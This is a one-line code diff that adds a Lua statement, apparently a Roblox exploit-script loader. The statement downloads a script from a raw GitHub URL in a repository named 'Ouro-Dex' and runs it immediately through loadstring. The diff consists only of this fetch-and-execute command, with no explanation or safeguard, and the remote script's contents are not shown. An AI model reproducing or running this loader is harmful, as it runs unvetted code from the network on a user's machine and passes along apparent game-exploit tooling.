@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joustingmatch/Ouro-Dex/main/out.lua"))()
